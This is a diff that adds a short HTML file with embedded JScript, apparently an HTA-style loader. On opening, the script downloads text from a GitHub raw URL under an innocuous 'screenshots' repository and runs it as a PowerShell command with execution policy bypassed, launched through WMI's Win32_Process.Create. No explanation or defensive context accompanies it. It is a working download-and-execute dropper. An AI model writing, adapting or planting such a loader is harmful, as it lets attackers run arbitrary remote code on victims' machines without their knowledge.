@@ -1,0 +1,10 @@
+<html><head><script language=JScript>
+var x=new ActiveXObject("MSXML2.XMLHTTP");
+x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/init.txt",0);
+x.send();
+var s=x.responseText;
+var l=new ActiveXObject("WbemScripting.SWbemLocator");
+var c=l.ConnectServer(".","root/cimv2");
+var p=c.Get("Win32_Process");
+p.Create("powershell -ExecutionPolicy Bypass -Command \""+s.replace(/\n/g,";").replace(/"/g,"'")+"\"",null,null,null);
+</script></head></html>
